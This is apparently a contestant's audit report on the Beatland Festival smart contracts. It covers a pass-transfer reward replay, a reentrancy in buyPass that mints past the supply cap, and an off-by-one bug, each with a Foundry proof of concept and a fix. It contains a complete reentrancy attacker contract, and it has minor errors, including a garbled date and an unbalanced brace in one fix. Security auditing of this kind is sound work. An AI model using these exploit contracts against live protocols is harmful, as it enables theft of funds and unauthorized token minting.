# Audit Contest Summary: [Beatland_Festival]

This document summarizes the results and key findings from my participation in the `Codehawk` audit contest, held for the `Beatland Festival` codebase.

- [Audit Contest Summary: \[Beatland\_Festival\]](#audit-contest-summary-beatland_festival)
  - [1. Overview \& Project Details](#1-overview--project-details)
  - [2. Contest Performance Summary](#2-contest-performance-summary)
- [Detailed Audit Findings (Valid Submissions)](#detailed-audit-findings-valid-submissions)
  - [High](#high)
    - [\[H-1\] Sybil Attack via `safeTransferFrom` Allows Multiple Rewards for a Single Pass and Bypasses Time-Locking](#h-1-sybil-attack-via-safetransferfrom-allows-multiple-rewards-for-a-single-pass-and-bypasses-time-locking)
  - [Medium](#medium)
    - [\[M-1\] Reentrancy in buyPass allows bypassing passMaxSupply to mint unlimited passes](#m-1-reentrancy-in-buypass-allows-bypassing-passmaxsupply-to-mint-unlimited-passes)
    - [\[M-2\] Off-by-one error in redeemMemorabilia prevents minting of the last item](#m-2-off-by-one-error-in-redeemmemorabilia-prevents-minting-of-the-last-item)


## 1. Overview & Project Details

| Field               | Detail                                                                                       |
| :------------------ | :------------------------------------------------------------------------------------------- |
| **Project Audited** | **Beatland Festival**                                                                        |
| **Contest Period**  | 2025/07/17 – 2025/07/2413                                                                    |
| **Codebase Link**   | [2025-07-beatland-festival](https://github.com/CodeHawks-Contests/2025-07-beatland-festival) |
| **Final Report**    | [Final Report](https://codehawks.cyfrin.io/c/2025-07-beatland-festival/results?t=report)     |



---

## 2. Contest Performance Summary

This section provides a statistical breakdown of my submission compared to the final results.
| Category            | My Valid Findings | Total in Contest |
| :------------------ | :---------------: | :--------------: |
| **High Severity**   |       **1**       |        1         |
| **Medium Severity** |       **2**       |        3         |
| **Medium Severity** |       **0**       |        2         |

---


# Detailed Audit Findings (Valid Submissions)

## High

### [H-1] Sybil Attack via `safeTransferFrom` Allows Multiple Rewards for a Single Pass and Bypasses Time-Locking

**Description:** 
The `attendPerformance` function tracks participation and cooldowns solely based on `msg.sender` using the `hasAttended` and `lastCheckIn` mappings. Because the protocol inherits the `ERC1155` standard, a pass holder can circumvent these restrictions by exploiting the `safeTransferFrom` function to move their Pass to a fresh wallet address. Since the new address has no historical record in the mappings, the attacker can immediately call `attendPerformance` again to claim multiple rewards for the same event and bypass the global COOLDOWN period. This Sybil attack allows a single Pass to be used infinitely across different accounts to mint excessive amounts of BeatToken, effectively breaking the protocol's reward logic.

```solidity
@> function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) public virtual {
@>     address sender = _msgSender();
@>     if (from != sender && !isApprovedForAll(from, sender)) {
@>         revert ERC1155MissingApprovalForAll(sender, from);
@>     }
@>     _safeTransferFrom(from, to, id, value, data);
   }
```

**Impact:**  High
The vulnerability allows a single Pass to be reused indefinitely to claim rewards. Since BeatToken is minted as a reward, this leads to an infinite minting exploit, causing severe token inflation and potentially draining the economic value of the entire protocol.

**Likelihood**: High
Exploiting this is low-cost and trivial to execute. Any user can easily transfer ERC1155 tokens between their own wallets using `safeTransferFrom` or via a simple script to automate the Sybil attack and bypass all participation restrictions.

**Proof of Concept:**
User1 buys a pass, attends a performance, and then transfers the pass to User2's address. User2 can then immediately attend the same performance and claim rewards using the same pass.

<details>
<summary>Proof of Code</summary>

```solidity
    
    function test_ExploitRewardViaSafeTransferFrom() public{
        // User buys a general pass
        vm.prank(user1);
        festivalPass.buyPass{value: GENERAL_PRICE}(1);
        
        // Organizer creates a performance
        uint256 startTime = block.timestamp + 1 hours;
        vm.prank(organizer);
        uint256 perfId = festivalPass.createPerformance(startTime, 1 days, 100e18);
        
        // Warp to performance time
        vm.warp(startTime + 30 minutes);

     
        vm.startPrank(user1);
        // User1 attends performance
        vm.expectEmit(true, true, true, true);
        emit Attended(user1, perfId, 100e18);
        festivalPass.attendPerformance(perfId);

        // user 1 send the pass to user 2
        festivalPass.safeTransferFrom(user1, user2,1,1,"");
        vm.stopPrank();

        // user 2 attends the performance
        vm.prank(user2);
        vm.expectEmit(true, true, true, true);
        emit Attended(user2, perfId, 100e18);
        festivalPass.attendPerformance(perfId);

        //user1 and user2 should both have received rewards
        assertEq(beatToken.balanceOf(user1), 100e18);
        assertEq(beatToken.balanceOf(user2), 100e18);

    }

```
</details>

**Recommended Mitigation:** Override the `ERC1155` `_update` function to implement a selective Soulbound logic, The function must revert any peer-to-peer transfers (where both from and to are non-zero) if the token id is less than or equal to 3. This ensures that these specific passes remain non-transferable while maintaining standard functionality for all other token IDs. 

```diff

+     function _update(
+         address from, 
+         address to, 
+         uint256[] memory ids, 
+         uint256[] memory values
+     ) internal virtual override {
+         if (from != address(0) && to != address(0)) {
+             for (uint256 i = 0; i < ids.length; i++) {
+    // Check if the token ID belongs to the restricted Pass category
+                if (ids[i] <= 3) {
+                       revert("Transfer is not allowed");}
+         }
+         
+         super._update(from, to, ids, values);
+     }
   
```



## Medium

### [M-1] Reentrancy in buyPass allows bypassing passMaxSupply to mint unlimited passes

**Description:** The `buyPas`s function fails to follow the CEI pattern. It calls`_mint()`—which triggers an `onERC1155Received` callback—before incrementing `passSupply`. An attacker can re-enter `buyPass` during the callback to mint unlimited passes and multiple BeatToken bonuses, as the supply check `passSupply < passMaxSupply` remains true during recursion.


```solidity

    function buyPass(uint256 collectionId) external payable {
        // Must be valid pass ID (1 or 2 or 3)
        require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
        // Check payment and supply
        require(msg.value == passPrice[collectionId], "Incorrect payment amount");
        require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
        // Mint 1 pass to buyer
@>        _mint(msg.sender, collectionId, 1, "");
@>        ++passSupply[collectionId];
        ....
    
    }
```
**Likelihood:** 
- Native Trigger: The ERC1155 standard explicitly requires a callback to the receiver, providing a guaranteed entry point for reentrancy.

- No Protection: The function lacks a nonReentrant guard, and the state update (Effect) is explicitly positioned after the external call (Interaction), making the exploit trivial to execute.

**Impact:** 
- Violation of Scarcity: Attackers can break the hard cap of the pass supply, destroying the economic model of the festival.

- Token Inflation: The vulnerability allows for the unauthorized minting of BeatToken rewards. Since the bonus logic is inside the reentrant loop, an attacker can siphon a massive amount of "welcome bonuses" far beyond the intended limit.

**Proof of Concept:**

<details>
<summary>Proof Of Code</summary>

**ReentrancyAttacker.sol:**

``` Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {FestivalPass} from "../src/FestivalPass.sol";
import "@openzeppelin/contracts/utils/introspection/IERC165.sol";


contract ReentrancyAttacker is IERC1155Receiver {
    FestivalPass public festivalPass;
    uint256 public attackCount;
    uint256 public maxAttack ;
    constructor(address targetAddress) {
        festivalPass = FestivalPass(targetAddress);        
    }

    function attack(uint256 _maxAttack) public payable {
        maxAttack = _maxAttack;
        uint256 price = festivalPass.passPrice(3);
        festivalPass.buyPass{value:price}(3);
        
    }
  

     function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4){
        if(attackCount < maxAttack){
            attackCount++;
            uint256 price = festivalPass.passPrice(3);
            festivalPass.buyPass{value:price}(3);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external override pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

     function supportsInterface(bytes4 interfaceId) external override pure returns (bool){
        return interfaceId == type(IERC1155Receiver).interfaceId ||
        interfaceId == type(IERC165).interfaceId;

     }

     receive() external payable {}
}
```
**Test:**

```solidity

    function testBuyPassReentracy() public {
      
        vm.deal(address(reentracyAttacker), 10000 ether);

        vm.prank(organizer);
        festivalPass.configurePass(3, 1 ether, 10);

        uint256 attackCount = 99;
        reentracyAttacker.attack(attackCount);
        
        //passMaxSupply(3) = 10；
        assert(festivalPass.passSupply(3) > festivalPass.passMaxSupply(3));
        //attackCount = 99 + 1
        assertEq(festivalPass.passSupply(3),100);
        //BACKSTAGE gets 15 BEAT each buying: 100*15 = 1500
        assertEq(beatToken.balanceOf(address(reentracyAttacker)),1500 ether);

    }

    }

```
</details>

**Recommended Mitigation:** 
Implement OpenZeppelin's `ReentrancyGuard` by adding the `nonReentrant` modifier to the buyPass function and strictly follow the `Checks-Effects-Interactions (CEI)` pattern by incrementing `passSupply[collectionId]` before calling the _mint function.

```diff
+    import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

-    function buyPass(uint256 collectionId) external payable {
+    function buyPass(uint256 collectionId) external payable nonReentrant()  {
  
        // Must be valid pass ID (1 or 2 or 3)
        require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
        // Check payment and supply
        require(msg.value == passPrice[collectionId], "Incorrect payment amount");
        require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
        // Mint 1 pass to buyer

-        _mint(msg.sender, collectionId, 1, "");
        ++passSupply[collectionId];
        // VIP gets 5 BEAT welcome bonus BACKSTAGE gets 15 BEAT welcome bonus
        uint256 bonus = (collectionId == VIP_PASS) ? 5e18 : (collectionId == BACKSTAGE_PASS) ? 15e18 : 0;
        if (bonus > 0) {
            // Mint BEAT tokens to buyer
            BeatToken(beatToken).mint(msg.sender, bonus);
        }
+        _mint(msg.sender, collectionId, 1, "");
        emit PassPurchased(msg.sender, collectionId);

    }
```



### [M-2] Off-by-one error in redeemMemorabilia prevents minting of the last item

**Description:** The `redeemMemorabilia` function uses a strict `<` operator to check if the collection is sold out. Since currentItemId starts at 1, the check `collection.currentItemId < collection.maxSupply` will revert when `currentItemI`d equals `maxSupply`. This prevents the very last item of every collection from being redeemed.

```solidity
        function redeemMemorabilia(uint256 collectionId) external {
        //gas-efficient to check collection existence
        MemorabiliaCollection storage collection = collections[collectionId];
        require(collection.priceInBeat > 0, "Collection does not exist");// @audit-info if necessary
        require(collection.isActive, "Collection not active");
@>        require(collection.currentItemId < collection.maxSupply, "Collection sold out");
        .....
}
```

**Impact:** Low
- The actual total supply will always be maxSupply - 1.
- Loss of revenue for the organizer for the last item.
- Total denial of service if maxSupply is set to 1.

**Likelihood:** High
The bug is certain to occur whenever a collection reaches its capacity. It does not require a malicious attacker or complex conditions; it is a fundamental logic error that will 100% trigger during normal user activity, preventing the final mint in every single collection created.

**Proof of Concept:**

```solidity
     function test_OffByOne_CollectionSoldOutEarly() public {
        // mint user beatToken to user1 and user2
        vm.startPrank(address(festivalPass));
        beatToken.mint(user1, 10e18);
        beatToken.mint(user2, 10e18);
        vm.stopPrank();
        // create a new memorabilia collection with max supply 2
        vm.prank(organizer);
        uint256 collectionId = festivalPass.createMemorabiliaCollection("test", "test_uri", 1e18, 2, true);
        uint256 tokenId = festivalPass.encodeTokenId(collectionId, 1);
        // user 1 should seccessfully redeem
        vm.startPrank(user1);
        vm.expectEmit(true, true, false, true);
        emit MemorabiliaRedeemed(user1, tokenId, collectionId, 1);
        festivalPass.redeemMemorabilia(collectionId);
        vm.stopPrank();
        // should revert with "Collection sold out"
        vm.startPrank(user2);
        vm.expectRevert("Collection sold out");
        festivalPass.redeemMemorabilia(collectionId);
        vm.stopPrank();

    }
```

**Recommended Mitigation:** 
Change the comparison operator from `<` to `<=`:


```diff
        function redeemMemorabilia(uint256 collectionId) external {
        //gas-efficient to check collection existence
        MemorabiliaCollection storage collection = collections[collectionId];
        require(collection.priceInBeat > 0, "Collection does not exist");// @audit-info if necessary
        require(collection.isActive, "Collection not active");
-       require(collection.currentItemId < collection.maxSupply, "Collection sold out");
+       require(collection.currentItemId <= collection.maxSupply, "Collection sold out");
        .....
}
```